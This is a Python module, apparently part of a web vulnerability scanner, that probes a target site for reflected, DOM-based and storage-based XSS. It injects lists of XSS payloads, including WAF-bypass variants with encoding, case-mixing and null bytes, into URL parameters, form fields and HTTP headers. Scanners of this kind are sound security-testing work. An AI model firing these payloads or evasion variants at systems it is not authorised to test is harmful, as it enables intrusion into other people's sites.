#!/usr/bin/env python3
# coding:utf-8
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# modules/xss/xss.py — Module de détection XSS avancé.
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
from __future__ import annotations

import html as html_module
import logging
import re
import time
import urllib.parse
from dataclasses import dataclass
from functools import lru_cache
from typing import Final, Generator

import requests
from bs4 import BeautifulSoup

from utils import extract_form_fields

logger = logging.getLogger("webmapper.xss")

DELAY: Final[float] = 0.5
TIMEOUT: Final[int] = 10


# Payloads XSS

# Payloads de base (reflected classique)
BASIC_PAYLOADS: Final[tuple[str, ...]] = (
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "'><<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    "<body onload=alert(1)>",
)

# Payloads WAF bypass (encodages, obfuscation, cas-mixing)
WAF_BYPASS_PAYLOADS: Final[tuple[str, ...]] = (
    # Cas-mixing
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Null bytes
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    # Unicode escaping
    "<script>al\\u0065rt(1)</script>",
    # Tab/newline injection
    "<img\tsrc=x\tonerror=alert(1)>",
    "<img\nsrc=x\nonerror=alert(1)>",
    # Event handler variations
    '<svg onload="alert(1)">',
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    # Href/src javascript:
    '<a href="javascript:alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
    # Data URI
    '<object data="data:text/html,<script>alert(1)</script>">',
    # Template literals (ES6)
    "${alert(1)}",
    "`${alert(1)}`",
    # SVG variants
    "<svg><script>alert(1)</script></svg>",
    '<svg><animate onbegin="alert(1)" attributeName="x">',
    # mXSS (mutation-based)
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<noscript><img src=x onerror=alert(1)></noscript>",
)


# DOM-based XSS — Sources et Sinks dangereux

# Sources DOM : points d'entrée contrôlables par l'attaquant
DOM_SOURCES: Final[tuple[str, ...]] = (
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "document.baseURI",
    "location.href",
    "location.search",
    "location.hash",
    "location.pathname",
    "window.name",
    "document.cookie",
    "history.pushState",
    "history.replaceState",
    "localStorage.",
    "sessionStorage.",
    "IndexedDB",
    "WebSocket",
    "postMessage",
    "URLSearchParams",
)

# Sinks DOM : points d'exécution dangereux
DOM_SINKS: Final[tuple[str, ...]] = (
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML",
    "document.write(",
    "document.writeln(",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "execScript(",
    ".src=",
    ".href=",
    ".action=",
    ".data=",
    "$.html(",
    "$.append(",
    "$.prepend(",
    "$.after(",
    "$.before(",
    "$.replaceWith(",
    "$.parseHTML(",
    "v-html",          # Vue.js
    "dangerouslySetInnerHTML",  # React
    "[innerHTML]",     # Angular
    "bypassSecurityTrust",  # Angular DomSanitizer bypass
)


# Helpers

def _is_reflected(response_text: str, payload: str) -> bool:
    """Vérifie si le payload est reflété (brut ou partiellement décodé)."""
    if payload in response_text:
        return True
    if payload in html_module.unescape(response_text):
        return True
    # Vérification après URL-decode
    decoded = urllib.parse.unquote(response_text)
    if payload in decoded:
        return True
    return False


def _generate_waf_bypass_variants(payload: str) -> Generator[str, None, None]:
    """Génère des variantes WAF bypass d'un payload à la volée.

    Générateur lazy : les variantes sont produites une par une,
    sans charger toutes les combinaisons en RAM.

    Yields:
        Variantes encodées/obfusquées du payload.
    """
    # Original
    yield payload
    # URL-encoded
    yield urllib.parse.quote(payload)
    # Double URL-encoded
    yield urllib.parse.quote(urllib.parse.quote(payload))
    # HTML entities
    yield payload.replace("<", "&lt;").replace(">", "&gt;")
    # Cas-mixing (inverser la casse des lettres)
    yield payload.swapcase()
    # Espaces remplacés par des commentaires HTML
    yield payload.replace(" ", "/**/")
    # Espaces remplacés par des tabs
    yield payload.replace(" ", "\t")


@lru_cache(maxsize=128)
def _extract_js_content(html_source: str) -> tuple[str, ...]:
    """Extrait le contenu JavaScript inline d'une page HTML.

    Résultat mis en cache LRU car une même page peut être analysée
    par plusieurs checks DOM.

    Args:
        html_source: Code source HTML complet.

    Returns:
        Tuple de blocs JavaScript trouvés.
    """
    soup = BeautifulSoup(html_source, "html.parser")
    scripts: list[str] = []
    for tag in soup.find_all("script"):
        content = tag.string
        if content and content.strip():
            scripts.append(content)
    return tuple(scripts)


# Détection DOM-based XSS

def _check_dom_xss(html_source: str, url: str) -> list[dict]:
    """Analyse statique du JavaScript pour détecter les patterns DOM XSS.

    Recherche les combinaisons source → sink dangereuses dans le JS inline.
    Analyse purement statique (pas de headless browser).

    Args:
        html_source: Code source HTML de la page.
        url:         URL de la page analysée.

    Returns:
        Liste de findings DOM-based XSS.
    """
    findings: list[dict] = []
    seen_patterns: set[str] = set()

    js_blocks = _extract_js_content(html_source)
    if not js_blocks:
        return findings

    full_js = "\n".join(js_blocks)

    for source in DOM_SOURCES:
        if source not in full_js:
            continue

        for sink in DOM_SINKS:
            if sink not in full_js:
                continue

            pattern_key = f"{source}→{sink}"
            if pattern_key in seen_patterns:
                continue
            seen_patterns.add(pattern_key)

            # Vérifier la proximité (même bloc de 500 caractères)
            for block in js_blocks:
                if source in block and sink in block:
                    findings.append({
                        "type": "XSS_DOM_BASED",
                        "severity": "high",
                        "url": url,
                        "detail": (
                            f"DOM-based XSS potentiel : source '{source}' "
                            f"vers sink '{sink}' dans le JavaScript inline."
                        ),
                        "evidence": (
                            f"Source: {source} | Sink: {sink} | "
                            f"Contexte: ...{block[max(0, block.index(source)-30):block.index(source)+60]}..."
                        )[:200],
                    })
                    break  # Un seul finding par combinaison source/sink

    return findings


#Détection Storage XSS

def _check_storage_xss(html_source: str, url: str) -> list[dict]:
    """Détecte les patterns Storage XSS (localStorage/sessionStorage).

    Cherche les cas où des données sont lues depuis le storage
    et injectées dans le DOM sans sanitization.

    Args:
        html_source: Code source HTML.
        url:         URL analysée.

    Returns:
        Liste de findings Storage XSS.
    """
    findings: list[dict] = []
    js_blocks = _extract_js_content(html_source)
    if not js_blocks:
        return findings

    full_js = "\n".join(js_blocks)

    # Patterns dangereux : lecture du storage → injection dans le DOM
    storage_read_patterns = (
        r"localStorage\.getItem\s*\(",
        r"sessionStorage\.getItem\s*\(",
        r"localStorage\[",
        r"sessionStorage\[",
    )

    for pattern in storage_read_patterns:
        matches = re.finditer(pattern, full_js)
        for match in matches:
            # Vérifier si le résultat est utilisé dans un sink
            context_start = max(0, match.start() - 100)
            context_end = min(len(full_js), match.end() + 200)
            context = full_js[context_start:context_end]

            for sink in ("innerHTML", "outerHTML", "document.write(",
                         "eval(", "$.html(", "$.append("):
                if sink in context:
                    findings.append({
                        "type": "XSS_STORAGE_BASED",
                        "severity": "medium",
                        "url": url,
                        "detail": (
                            f"Storage XSS potentiel : données lues depuis le storage "
                            f"('{match.group()}') et potentiellement injectées via '{sink}'."
                        ),
                        "evidence": f"Pattern: {match.group()} → {sink} | Contexte: ...{context[:150]}...",
                    })
                    break  # Un seul sink par lecture de storage

    return findings


# Scan principal

def scan(url: str, session: requests.Session) -> list[dict]:
    """Détecte les vulnérabilités XSS via multiple vecteurs d'attaque.

    Vecteurs couverts :
      1. XSS Reflected via paramètres GET
      2. XSS Reflected via formulaires (POST/GET, y compris hidden)
      3. XSS Reflected via en-têtes HTTP
      4. Bypass WAF (payloads encodés, obfusqués)
      5. DOM-based XSS (analyse statique JS)
      6. Storage XSS (localStorage/sessionStorage)

    Args:
        url:     URL cible.
        session: Session requests isolée.

    Returns:
        Liste de findings au format dict.
    """
    findings: list[dict] = []
    seen: set[str] = set()

    def add_finding(f: dict) -> None:
        """Ajoute un finding avec déduplication."""
        key = (f["type"], f.get("url", ""), f.get("evidence", "")[:40])
        if key not in seen:
            seen.add(key)
            findings.append(f)

    time.sleep(DELAY)

    try:
        response = session.get(url, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, "html.parser")
    except Exception as exc:
        logger.debug("Impossible de récupérer %s : %s", url, exc)
        return []

    # 1. Paramètres GET dans l'URL

    parsed = urllib.parse.urlparse(url)
    url_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    for param_name in url_params:
        # 1a. Payloads basiques
        for payload in BASIC_PAYLOADS:
            test = dict(url_params)
            test[param_name] = [payload]
            new_query = urllib.parse.urlencode(test, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            try:
                time.sleep(DELAY)
                res = session.get(test_url, timeout=TIMEOUT)
                if _is_reflected(res.text, payload):
                    add_finding({
                        "type": "XSS_REFLECTED",
                        "severity": "high",
                        "url": url,
                        "detail": f"XSS Reflected détecté sur le paramètre GET '{param_name}'.",
                        "evidence": f"Payload reflété : {payload[:80]}",
                    })
                    break
            except Exception as exc:
                logger.debug("Erreur test XSS GET param '%s' : %s", param_name, exc)

        # 1b. Payloads WAF bypass (si le basique n'a rien trouvé)
        if not any(f.get("detail", "").endswith(f"'{param_name}'.") for f in findings):
            for payload in WAF_BYPASS_PAYLOADS:
                test = dict(url_params)
                test[param_name] = [payload]
                new_query = urllib.parse.urlencode(test, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()
                try:
                    time.sleep(DELAY)
                    res = session.get(test_url, timeout=TIMEOUT)
                    if _is_reflected(res.text, payload):
                        add_finding({
                            "type": "XSS_WAF_BYPASS",
                            "severity": "high",
                            "url": url,
                            "detail": f"XSS WAF Bypass détecté sur le paramètre GET '{param_name}'.",
                            "evidence": f"Payload WAF bypass reflété : {payload[:80]}",
                        })
                        break
                except Exception as exc:
                    logger.debug("Erreur test XSS WAF bypass param '%s' : %s", param_name, exc)

    # 2. Formulaires HTML

    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = (form.get("method", "GET")).upper()
        target_url = urllib.parse.urljoin(url, action)

        template, injectable_names = extract_form_fields(form, include_hidden=True)

        if not injectable_names:
            continue

        for field_name in injectable_names:
            for payload in BASIC_PAYLOADS:
                params = template.copy()
                params[field_name] = payload
                try:
                    time.sleep(DELAY)
                    if method == "POST":
                        res = session.post(target_url, data=params, timeout=TIMEOUT)
                    else:
                        res = session.get(target_url, params=params, timeout=TIMEOUT)

                    if _is_reflected(res.text, payload):
                        add_finding({
                            "type": "XSS_REFLECTED",
                            "severity": "high",
                            "url": target_url,
                            "detail": (
                                f"XSS Reflected détecté dans le formulaire {method} "
                                f"(champ : '{field_name}')."
                            ),
                            "evidence": f"Payload reflété : {payload[:80]}",
                        })
                        break
                except Exception as exc:
                    logger.debug(
                        "Erreur test XSS formulaire champ '%s' : %s",
                        field_name, exc,
                    )

    # 3. Injection d'en-têtes HTTP

    target_headers = ["X-Forwarded-For", "User-Agent", "Referer"]
    for header in target_headers:
        for payload in BASIC_PAYLOADS[:3]:
            try:
                time.sleep(DELAY)
                res = session.get(
                    url, headers={header: payload}, timeout=TIMEOUT,
                )
                if _is_reflected(res.text, payload):
                    add_finding({
                        "type": "XSS_REFLECTED_HEADER",
                        "severity": "high",
                        "url": url,
                        "detail": f"XSS Reflected détecté via l'en-tête HTTP '{header}'.",
                        "evidence": f"Payload reflété : {payload[:80]}",
                    })
                    break
            except Exception as exc:
                logger.debug("Erreur test XSS header '%s' : %s", header, exc)

    # 4. DOM-based XSS (analyse statique)

    dom_findings = _check_dom_xss(response.text, url)
    for f in dom_findings:
        add_finding(f)

    # 5. Storage XSS

    storage_findings = _check_storage_xss(response.text, url)
    for f in storage_findings:
        add_finding(f)

    return findings
